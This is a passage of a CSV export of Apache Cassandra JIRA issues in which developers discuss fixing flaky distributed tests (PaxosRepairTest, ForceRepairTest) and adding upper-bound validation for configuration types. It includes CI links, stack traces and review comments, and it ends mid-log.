|[4.0 |https://github.com/apache/cassandra/pull/1743]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1958/workflows/120ace71-13ef-4968-b50c-3d1cc899eef4] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1958/workflows/49e528f0-7203-4e53-b240-fca559724296]|
|[4.1 |https://github.com/apache/cassandra/pull/1744]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1960/workflows/d03a643e-e180-40ff-9700-bd9ab5b093bb] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1960/workflows/03a70f7e-155a-43fb-97c2-cfb64fb35937]|
|[trunk|https://github.com/apache/cassandra/pull/1745]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1957/workflows/93336e6a-f6ef-4476-90ab-f678b898385d] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1957/workflows/fdd6d458-2eea-4e4c-9330-771ff2f8b50b]|;;;","05/Aug/22 12:49;e.dimitrova;Thanks [~adelapena] for getting to the bottom of this. I can review it next week if no one beats me to that. In the meantime removing it from the Kanban as a beta blocker;;;","08/Aug/22 21:40;e.dimitrova;Overall LGTM.

From what I see the patch is the same for all branches (4.0 link in the table is broken but I found it from the CI run), I left just two tiny suggestions on the 3.11 PR.

CI also good. All known failures, some will disappear after rebase, like the simulator one which was recently fixed.;;;","09/Aug/22 13:40;adelapena;Thanks for the review, I have addressed the suggestions, rebased and run CI:
||PR||CI||
|[3.11 |https://github.com/apache/cassandra/pull/1742]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1978/workflows/daea157d-071d-46e4-be96-a5035cb5e2a4]|
|[4.0  |https://github.com/apache/cassandra/pull/1743]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1977/workflows/af17c3e8-d48e-4da4-bc89-7ef60bcec53b] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1977/workflows/fb5a4071-d713-41fc-946d-50e6507d67be]|
|[4.1  |https://github.com/apache/cassandra/pull/1744]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1976/workflows/73720f5c-2a47-44ed-8b16-97a281d6ebcf] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1976/workflows/d26aa01f-5d98-4e38-991c-313c052546ec]|
|[trunk|https://github.com/apache/cassandra/pull/1745]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1975/workflows/7d8af703-ef47-4fa9-abd0-c750644d6041] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1975/workflows/46086c73-53c5-4d2c-9a5b-6e2a5a23b0bb]|;;;","12/Aug/22 09:43;adelapena;Committed to 3.11 as [4e410fc46da5d6759463230ab09a718178dbd4d9|https://github.com/apache/cassandra/commit/4e410fc46da5d6759463230ab09a718178dbd4d9] and merged to [4.0|https://github.com/apache/cassandra/commit/174e0dc399c998a61eff670bd4980308a239482f], [4.1|https://github.com/apache/cassandra/commit/16be1ab073f6fac7df1ac838c7a89e862cf9f2e1] and [trunk|https://github.com/apache/cassandra/commit/5279d7f57edf8760ccfb0b388b750b020dd97ac2].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix test org.apache.cassandra.distributed.test.PaxosRepairTest#paxosRepairVersionGate,CASSANDRA-17573,13440987,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,benedict,dcapwell,dcapwell,21/Apr/22 18:39,05/Oct/22 22:22,13/Jul/23 08:40,12/Sep/22 13:10,4.1-beta1,,,,,,Consistency/Repair,Feature/Lightweight Transactions,Test/dtest/java,,0,,"https://app.circleci.com/pipelines/github/dcapwell/cassandra/1381/workflows/4a4e6100-6582-43fd-8f39-6b3cbb5a94b6/jobs/11282/tests#failed-test-0

{code}
junit.framework.AssertionFailedError: Repair failed with errors: [Repair session aa00ae00-c192-11ec-89f5-d521036fedec for range [(000000c8,0000012c], (00000064,000000c8], (0000012c,00000064]] failed with error Paxos cleanup session a1fe1fea-7522-47ec-879a-7f2e6cc592ad failed on /127.0.0.3:7012 with message: Unsupported peer versions for a6404aa0-c192-11ec-89f5-d521036fedec [(000000c8,0000012c], (00000064,000000c8], (0000012c,00000064]], Repair command #3 finished with error]
	at org.apache.cassandra.distributed.test.PaxosRepairTest.lambda$repair$54f7d7c2$1(PaxosRepairTest.java:189)
	at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
	at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
	at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:834)
{code}",,bdeggleston,benedict,blerer,dcapwell,e.dimitrova,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,benedict,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Sep 12 13:10:34 UTC 2022,,,,,,,All,,,,"0|z11orc:",9223372036854775807,,,,bdeggleston,,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/49cd4b5f79e4cda16668cce8aea7d93d480f48fc,,,,,,,,,circle,,,,,"21/Apr/22 18:40;dcapwell;marking 4.1 to be addressed before we release 4.1 (can't release with flaky tests);;;","30/May/22 17:25;e.dimitrova;I don't see it in Butler, but managed to reproduce it in CircleCI [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17573-4.1&filter=all] - fails 4-5% of the time with MIDRES.;;;","30/May/22 18:20;e.dimitrova;I ran in a loop the test class with the patch where it was introduced and it seems that it was a bit flaky from the very beginning - CASSANDRA-17164, CEP-14, Paxos Improvements

[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1666/workflows/65b903f3-4055-4d0c-8176-fc17ac019e37/jobs/11659]

[~benedict] , [~bdeggleston] , [~ifesdjeen] , [~samt] , [~aleksey], can anyone of you, please, look into it?;;;","31/May/22 11:09;benedict;So I don't _think_ this was one of my tests, but I can't recall for sure.

I suspect the problem is Gossip propagating the version data around the cluster. I'm not actually certain why we're enabling network and gossip here at all, to be honest, which might be a simple fix.

[~bdeggleston] do you remember this test?;;;","31/May/22 12:27;benedict;Ok, looking at it more closely, the issue is that the release version is replicated by Paxos electorate verification (not sure why, haven't looked closely). So if we set the release version on every node the problem resolves. I will post a patch shortly.
;;;","31/May/22 15:05;benedict;https://github.com/belliottsmith/cassandra/pull/new/17573-trunk;;;","31/May/22 19:49;bdeggleston;+1;;;","21/Jun/22 01:49;e.dimitrova;Triaging the 4.1 blockers board and stumbled into this one. I think we need also a 4.1 patch. 

Can we also run again the test in a loop in order to confirm that it is not flaky anymore?

Please feel free to cherry-pick [this commit|https://github.com/ekaterinadimitrova2/cassandra/commit/8a9f13b6d6601c2a0d48f29f6829cf6ab23054e7] which includes the Circle config I used to run it in a loop to reproduce it before. 

The following command was used to generate the config:
{code:java}
.circleci/generate.sh -m -e  REPEATED_UTEST_TARGET=test-jvm-dtest-some -e REPEATED_UTEST_CLASS=org.apache.cassandra.distributed.test.PaxosRepairTest  -e REPEATED_DTEST_COUNT=500{code};;;","05/Aug/22 17:09;e.dimitrova;This is one of our last blockers and I had some cycles today so pushed to test on 4.1 and trunk the patch (the test in a loop using the config mentioned in my previous comment):
[4.1|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17573-4.1-test]

[trunk|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17573-trunk-test]

Happy to report it is all green, you might want to commit it if nothing new popped up since the patch was created;;;","29/Aug/22 16:19;brandon.williams;[~benedict] in the interest of moving 4.1 closer to release, would you like this committed if you are short on time?;;;","12/Sep/22 13:10;blerer;Committed into 4.1 at 49cd4b5f79e4cda16668cce8aea7d93d480f48fc and merged into trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Config upper bound should be handled earlier,CASSANDRA-17571,13440951,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,21/Apr/22 15:11,05/Oct/22 22:30,13/Jul/23 08:40,20/May/22 19:42,4.1,4.1-alpha1,,,,,Local/Config,,,,0,,Config upper bound should be handled on startup/config setup and not during conversion,,adelapena,e.dimitrova,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17649,,,,,,,,,,0.0,adelapena,e.dimitrova,,,,,,,,,,,,,Code,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri May 20 21:07:25 UTC 2022,,,,,,,All,,,,"0|z11ojc:",9223372036854775807,,,,adelapena,maedhroz,,,Low,,4.1,,https://github.com/apache/cassandra/commit/a67a2a2441589e8bf41498c426fddacd7b9719cf,,,,,,,,,Current tests plus additional unit tests,,,,,"21/Apr/22 15:19;e.dimitrova;Marking as 4.1 block as there was a discussion to add extended classes for Int to handle old int parameters upper bound and changing those in Config will be considered breaking change after a release. CC [~dcapwell]  and [~maedhroz] and [~mck] 

I will push the suggested classes in the next few hours for approval before moving any config to them. ;;;","22/Apr/22 01:50;e.dimitrova;Prototype in this [commit |https://github.com/ekaterinadimitrova2/cassandra/commit/1ab9f32ef34402a0f74036d768a22449170052b6] - only a few parameters were migrated for test purposes and to see how it will look like.
Also, I will split in separate commits the parameters in groups on migration with attached tests to them and CI to be sure gradually nothing Is missed but I want to confirm that the approach is still what we want. CC [~adelapena] in case he has time to provide input.

Currently if people provide the new config with the new format we handle the former int parameters by returning cast value from their getters,  but on startup the user might set a bigger long value and think wrongly that one will be used when in practice the Integer.MAX_VALUE will be used. We need just to fail the user they can't set that big value, mimic the behavior of when they provide old value bigger than int. We also limit with these classes that people cannot set anything that will overflow during conversion to the smallest allowed unit instead of setting MAX_VALUE silently. ;;;","24/Apr/22 18:00;e.dimitrova;[~dcapwell] , [~maedhroz], [~mck], [~adelapena] is anyone of you available to confirm  the drafted prototype and do review this week or should I ask anyone else from the community if you won't have time? ;;;","25/Apr/22 15:32;maedhroz;[~e.dimitrova] I'll take a look at the prototype today or tomorrow.;;;","26/Apr/22 19:29;e.dimitrova;Thanks, looking forward for your feedback. I am on standby ready to incorporate any feedback and move the former int config to the extended classes before the 1st is here. Unfortunately, it will become noisy but it should be quick type change, using the old methods. ;;;","27/Apr/22 01:24;e.dimitrova;I spent my evening again thinking about this as really those extensions become convoluted but I don't see a better way at this point. 

Like I can get back validation utility methods in the DD and leave considering better general handling with next version but this is error-prone. 

Creating a new range max annotation to all new properties in Config is not really easy option as we would need conversions... The best is to do it in the constructors at this point. 

I will sleep on it and finish tomorrow morning. In case someone has something better in the meantime - I am open to hear it. ;;;","27/Apr/22 01:35;e.dimitrova;On the bright side, this is not a regression as we handle the old config input types in Converters(former ints cannot be set long value) so in my humble opinion even if we fix the new config upper bound after the freeze on the 1st, this is not a regression we have here and no API change will be involved.  I don't plan too prolong it but if we want more time to shape the solution a bit or for final review - I think we have it. CC [~mck] in case he disagrees with this statement;;;","27/Apr/22 13:33;e.dimitrova;Working to migrate the parameters to the extended classes so we can do upper bound (former int type Config parameters and overflow of big value bigger unit to smaller supported internally) checks in the constructors. Might be not most beautiful but at least we will be more consistent and less error-prone then utility methods in the DD. ;;;","29/Apr/22 00:46;e.dimitrova;WIP:

[https://github.com/ekaterinadimitrova2/cassandra/pull/new/17571-trunk-rebased]

Intermediate CI runs:

[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1569/workflows/f67be620-844b-4151-9cd9-e7b16b9e0578] - the DD test was fixed after that but didn't rerun the whole suite only for it...

[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1570/workflows/a8f6c673-a5e6-4986-8077-e2955d6ab949] –> I probably need to loop the test before and after the patch, known to be flaky but just to ensure frequency and errors match

[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1571/workflows/90ef96bd-daa8-4a65-8915-d3ca746bd10d] - known failures

 

So the biggest part is done. I need to verify that ConnectionTest, that I didn't contribute in a way for more flakiness but I doubt it. 

Other ToDos - there are two former int parameters unreleased that were directly switched to the new types, I have them ready locally, need to double check and commit.

News.txt, CHANGES.txt and docs need update; also JavaDoc. I had in ToDo to move the *AsInt methods from the parent classes to the extensions but I am not sure I will have to. I will check tomorrow morning and push for final review.

AND full CI. I was testing now just J11 midres, but I will push at the end both J8 and J11, all tests

 

 ;;;","11/May/22 18:43;e.dimitrova;For the record, [~adelapena] suggested nested classes as we might need also other numeric types in the future and that refactoring will help us to maintain the types easily. Also, the code shrinks nicely and all upper bound validations will be in the constructors.

I will post the final version for review later today.;;;","12/May/22 05:38;e.dimitrova;[4.1 patch|https://github.com/apache/cassandra/compare/cassandra-4.1...ekaterinadimitrova2:17571-squashed]| [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17571-squashed&filter=all] | [PR|https://github.com/ekaterinadimitrova2/cassandra/pull/199]

I will update the docs when we confirm the details during review. ;;;","13/May/22 17:53;maedhroz;+1;;;","17/May/22 02:27;e.dimitrova;Thanks, I just addressed the review comments and  [ran CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=review&filter=all] on 4.1. 2 known failures and 2 unit tests that I have missed to update. Added to the PR a fix now.

A few things to mention here:
 * I also updated the docs plus added min unit in cassandra.yaml for the properties where it made sense. What I mean - if a property default value is in B in the yaml, it is obvious we can set all units, so it didn't make sense to me to pollute the yaml for those properties.
 * Worth to mention here that now all three main classes (DataRateSpec, DurationSpec, DataStorageSpec) are abstract and people should use the extended classes which are now tested. I added a test to validate Config types, that people didn't use as type abstract class with constructor of a nested class. This will compile fine and if no value is set in cassandra.yaml, everything will be fine, BUT if someone adds a value in the yaml - then Cassandra won't start because SnakeYAML will want to use abstract class constructor. [The test|https://github.com/ekaterinadimitrova2/cassandra/pull/199/files#diff-392bbe6df967db1b9b2c70cb97bbd84779fa847b11573ed11ca601578ebf2936R48-R59] I added checks that no parameter has as a type any of the three abstract classes to prevent us from future bugs. In that sense, paxos_purge_grace_period is fixed now as the author has done the mistake I mentioned originally. (using the main class and because the main classes were not abstract this was even worse as de facto the smallest Duration unit was set to nanoseconds).

The patch is noisy because a big part of it is moving things around and renaming of the classes, the actual code is 200-300 lines of code. ;;;","18/May/22 01:40;e.dimitrova;I addressed review comments from [~adelapena]. New CI run [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=review-2&filter=all]. There is one issue with DTest which is kind of weird and I will have to investigate it but other community members confirmed they've seen it too so it is not this patch. Might be even environmental. Also, one of the CQLSH run tests failed because of timeout during test docker image being pulled so it was not the patch. 

Also, for the record, based on offline discussion, we limited the conversions in the nested classes to only to the base internal min unit. This actually led me to discover a new parameter added which was converting to other units internally and probably relying on cassandra.yaml for the precision (there was a note on allowed units in cassandra.yaml without actually ensuring a lower unit was not provided by the user). I think this is a bug and I fixed it by making auto_snapshot_ttl internally in seconds as we have SNAPSHOT_MIN_ALLOWED_TTL_SECONDS.

This led to this [change|https://github.com/ekaterinadimitrova2/cassandra/pull/199/files#diff-20db300621aef19985cb1752835ab00d37ed18a4abc23e3b67c769633d41a9a6L61]. Please let me know if you agree with this and I will update also cassandra.yaml. I think the other option based on the yaml is to do it minutes but then I guess we need to change also SNAPSHOT_MIN_ALLOWED_TTL_SECONDS and we are already in code freeze so I think setting min unit seconds is a good compromise. Considering we didn't announce in the yaml accepted units less than minutes for that property I do not consider this change a breaking one. More like preventive and fixing internally a possible precision issue/bug. 

-The story of this property is that it was added during Google Summer of Code with a WIP version of my DurationSpec class. When it came the time for CASSANDRA-15234 we changed the name of the class. Then I asked the mentors to check the property if there are any concerns and it seems they missed the point for precision described in the docs.- So long story short - thank you [~adelapena] for suggesting to tighten even more these classes! It is definitely worth it as a preventive action!

EDIT: It was introduced in CASSANDRA-16790 just before the freeze, mixed it with another one. ;;;","18/May/22 12:01;adelapena;[~e.dimitrova] I see that the conversion methods in {{DataStorageSpec}} [are still present|https://github.com/ekaterinadimitrova2/cassandra/blob/f2d56d54bf62f18e8daea7736639119c3fe1b89a/src/java/org/apache/cassandra/config/DataStorageSpec.java#L137-L189], and the leaf classes override them.

Also, if we are going to move the conversion methods to the leaf classes, we can probably get rid of the {{to*AsInt}} methods, and instead have, for example:
 * A {{DataStorageSpec.LongMebibytesBound#toMebibytes}} that returns {{long}}
 * A {{DataStorageSpec.IntMebibytesBound#toMebibytes}} that returns {{{}int{}}}.

That would be possible because we don't have a common inherited {{DataStorageSpec#toMebibytes}} anymore. I gave it a quick try in [this commit|https://github.com/adelapena/cassandra/commit/a7485d88a434dc321a60a006d4f36b294a139d49], which is just a sketch to show how it would look like.;;;","18/May/22 15:33;e.dimitrova;{quote}bq. the conversion methods in {{DataStorageSpec}} [are still present|https://github.com/ekaterinadimitrova2/cassandra/blob/f2d56d54bf62f18e8daea7736639119c3fe1b89a/src/java/org/apache/cassandra/config/DataStorageSpec.java#L137-L189], and the leaf classes override them.
{quote}
I knew it this green CI hides something :( Totally not meant to keep them. I will work it out, thanks. 

The commit looks good to me

 

 ;;;","18/May/22 22:04;e.dimitrova;Rebased and addressed your feedback and fixed a few nits I noticed.

There are a few warnings in the new types tests around equals but I don't think we should do any changes there. Maybe those assertions can be removed, they prove 5s are 5s no matter what. :);;;","19/May/22 14:38;e.dimitrova;Rebased and pushed the latest round of feedback being addressed. ;;;","20/May/22 16:10;e.dimitrova;Rebased [here|https://github.com/ekaterinadimitrova2/cassandra/pull/new/17571-final]  in a new branch to preserve the unsquashed version for reference.

(there were unfortunately merge conflicts after the exception handling patch committed yesterday but I think things are fine, at least unit tests Guardrails, setGet* and config are passing locally). The move of the static conversion methods led to IntKibibytesBoundToBytes which led to the need of change in the DatabaseDescriptor [here|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:17571-final?expand=1#diff-054af65b8d690b0fddc3e0a4ef05a80d8f1d6689b4f77912795fec019200666cR551] and [here|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:17571-final?expand=1#diff-054af65b8d690b0fddc3e0a4ef05a80d8f1d6689b4f77912795fec019200666cR3706] which should be fine as Integer.MAX_VALUE cannot be divided by 1024 to an integer so we don't need it.

I also removed one of the non-negative validations in the constructor which doesn't need it because that is ensured already by the pattern matching. I added a test for that too [here|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:17571-final?expand=1#diff-b02560e1a47ddce2e07855a3aaf2931b1987e17d75ff99d01d44fedcaf2d83b1R87]

CI running [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17571-final&filter=all]

trunk comes in 10 minutes I hope as I don't expect the cherry-picked commit to have many conflicts there. ;;;","20/May/22 16:24;e.dimitrova;[trunk|https://github.com/ekaterinadimitrova2/cassandra/pull/new/17571-trunk-final] patch,  [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17571-trunk-final&filter=all] started 

If everything is fine, I will add CHANGES.txt entry, add [~adelapena] as co-author and also add to the entry that we fixed two properties - auto_snapshot_ttl  and paxos_purge_grace_period;;;","20/May/22 19:51;e.dimitrova;The patch was committed after checking offline with [~maedhroz]  and [~adelapena] for final +1.

Special thanks to [~adelapena] for helping me to verify CI and double checking the rebase which had some conflicts.

There were a few unknown to me failures but we verified that they are not new by looping both with and without the patch:
 * 4.1 - _basicRangeTombstones_ - without the patch failed a few times here - [https://app.circleci.com/pipelines/github/adelapena/cassandra/1585/workflows/70aa2792-56ca-49e3-8fc7-749270041edc]

with the patch I found it once by looking at the logs of the failing containers as UI was not showing which are the failing tests - https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17571-more-tests&filter=all
 * trunk - 
[handleCorruptionOfLargeMessageFrame-compression|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1638/workflows/eb0712f6-d19e-4b0a-b0df-30e5107f880c/jobs/11342/tests#failed-test-0]
[testNegativeEnvelopeBodySize-compression|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1638/workflows/eb0712f6-d19e-4b0a-b0df-30e5107f880c/jobs/11342/tests#failed-test-1]
[testUnrecoverableMessageDecodingErrors-compression|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1638/workflows/eb0712f6-d19e-4b0a-b0df-30e5107f880c/jobs/11342/tests#failed-test-2]
[testRecoverableEnvelopeDecodingErrors-compression|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1638/workflows/eb0712f6-d19e-4b0a-b0df-30e5107f880c/jobs/11342/tests#failed-test-3] all those were proved as failing as part of CASSANDRA-16677. Multiplexer run -  [https://app.circleci.com/pipelines/github/adelapena/cassandra/1405/workflows/88fb8e4f-7a3f-42f9-a6db-5d14a652b54e/jobs/14141/tests] ;;;","20/May/22 21:07;e.dimitrova;Ticket for the flaky tests in TopPartitionsTest opened CASSANDRA-17649

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - org.apache.cassandra.distributed.test.repair.ForceRepairTest.force,CASSANDRA-17566,13440722,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,20/Apr/22 15:38,05/Oct/22 22:22,13/Jul/23 08:40,07/Jun/22 10:47,4.1,4.1-beta1,,,,,Test/dtest/java,,,,0,,"Seen on jenkins here: [https://ci-cassandra.apache.org/job/Cassandra-trunk/1083/testReport/org.apache.cassandra.distributed.test.repair/ForceRepairTest/force_2/]

 

and circle here:

https://app.circleci.com/pipelines/github/driftx/cassandra/440/workflows/42f936c7-2ede-4fbf-957c-5fb4e461dd90/jobs/5160/tests#failed-test-1

{noformat}
junit.framework.AssertionFailedError: nodetool command [repair, distributed_test_keyspace, --force, --full] was not successful
stdout:
[2022-04-20 15:11:01,402] Starting repair command #2 (1701a090-c0bc-11ec-9898-07c796ce6a49), repairing keyspace distributed_test_keyspace with repair options (parallelism: parallel, primary range: false, incremental: false, job threads: 1, ColumnFamilies: [], dataCenters: [], hosts: [], previewKind: NONE, # of ranges: 3, pull repair: false, force repair: true, optimise streams: false, ignore unreplicated keyspaces: false, repairPaxos: true, paxosOnly: false)
[2022-04-20 15:11:11,406] Repair command #2 failed with error Did not get replies from all endpoints.
[2022-04-20 15:11:11,408] Repair command #2 finished with error

stderr:
error: Repair job has failed with the error message: Repair command #2 failed with error Did not get replies from all endpoints.. Check the logs on the repair participants for further details
-- StackTrace --
java.lang.RuntimeException: Repair job has failed with the error message: Repair command #2 failed with error Did not get replies from all endpoints.. Check the logs on the repair participants for further details
	at org.apache.cassandra.tools.RepairRunner.progress(RepairRunner.java:137)
	at org.apache.cassandra.utils.progress.jmx.JMXNotificationProgressListener.handleNotification(JMXNotificationProgressListener.java:77)
	at javax.management.NotificationBroadcasterSupport.handleNotification(NotificationBroadcasterSupport.java:275)
	at javax.management.NotificationBroadcasterSupport$SendNotifJob.run(NotificationBroadcasterSupport.java:352)
	at org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.lang.Thread.run(Thread.java:748)
{noformat}",,dcapwell,e.dimitrova,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jun 07 10:47:21 UTC 2022,,,,,,,All,,,,"0|z11n4o:",9223372036854775807,,,,dcapwell,,,,Normal,,4.1-alpha,,https://github.com/apache/cassandra/commit/f809b6753cbbd27deab40679b99d956c8193fcf8,,,,,,,,,run CI,,,,,"26/Apr/22 16:33;brandon.williams;I haven't been able to reproduce this exact error, but it looks like it could be a timeout, and timeouts I can reproduce with this test on a machine with plenty of resources.  I went back to when this test was committed, and this behavior has been there since inception:

{noformat}
[junit-timeout] Testcase: org.apache.cassandra.distributed.test.repair.ForceRepairTest:forceWithDifference:     Caused an ERROR
[junit-timeout] Timeout occurred. Please note the time in the report does not reflect the time until the timeout.
[junit-timeout] junit.framework.AssertionFailedError: Timeout occurred. Please note the time in the report does not reflect the time until the timeout.
[junit-timeout]         at java.util.Vector.forEach(Vector.java:1277)
[junit-timeout]         at java.util.Vector.forEach(Vector.java:1277)
[junit-timeout] 
[junit-timeout] 
[junit-timeout] Test org.apache.cassandra.distributed.test.repair.ForceRepairTest FAILED (timeout)
{noformat}

I added some logging around the [args loop|https://github.com/apache/cassandra/blob/trunk/test/distributed/org/apache/cassandra/distributed/test/repair/ForceRepairTest.java#L83], which shows that sometimes there's a delay in the [nodetool failure|https://github.com/apache/cassandra/blob/trunk/test/distributed/org/apache/cassandra/distributed/test/repair/ForceRepairTest.java#L95]:

{noformat}
INFO  [main] <main> 2022-04-26 10:41:32,673 beginning --full
INFO  [main] <main> 2022-04-26 10:41:32,686 failure finished
INFO  [main] <main> 2022-04-26 10:41:32,723 success finished
INFO  [main] <main> 2022-04-26 10:41:32,724 finished --full
INFO  [main] <main> 2022-04-26 10:41:32,724 beginning --preview
INFO  [main] <main> 2022-04-26 10:46:32,734 failure finished
INFO  [main] <main> 2022-04-26 10:46:32,794 success finished
INFO  [main] <main> 2022-04-26 10:46:32,796 finished --preview
INFO  [main] <main> 2022-04-26 10:46:32,796 beginning --validate
INFO  [main] <main> 2022-04-26 10:51:32,803 failure finished
INFO  [main] <main> 2022-04-26 10:51:32,840 success finished
INFO  [main] <main> 2022-04-26 10:51:32,848 finished --validate
{noformat}
 
 which is interestingly always 5 minutes.  Here is node1's relevant log for the preview at 10:41:32,724:

{noformat}
DEBUG [node1_Repair#6:1] node1 2022-04-26 10:41:32,726 [preview repair #5906ca00-c577-11ec-b392-2548bbd24495] session task executor shut down gracefully
INFO  [node1_Repair-Task:1] node1 2022-04-26 10:41:32,732 Starting repair command #7 (590b0fc0-c577-11ec-b392-2548bbd24495), repairing keyspace distributed_test_keyspace with repair options (parallelism: parallel, primary range: false, incremental: true, job threads: 1, ColumnFamilies: [], dataCenters: [], hosts: [], previewKind: UNREPAIRED, # of ranges: 3, pull repair: false, force repair: false, optimise streams: false, ignore unreplicated keyspaces: false, repairPaxos: false, paxosOnly: false)
ERROR [node1_Repair-Task:1] node1 2022-04-26 10:41:32,733 Repair 590b0fc0-c577-11ec-b392-2548bbd24495 failed:
java.lang.RuntimeException: Endpoint not alive: /127.0.0.2:7012
        at org.apache.cassandra.service.ActiveRepairService.failRepair(ActiveRepairService.java:726)
        at org.apache.cassandra.service.ActiveRepairService.prepareForRepair(ActiveRepairService.java:652)
        at org.apache.cassandra.repair.RepairRunnable.prepare(RepairRunnable.java:401)
        at org.apache.cassandra.repair.RepairRunnable.runMayThrow(RepairRunnable.java:280)
        at org.apache.cassandra.repair.RepairRunnable.run(RepairRunnable.java:249)
        at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
        at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
        at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
        at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
        at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
        at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
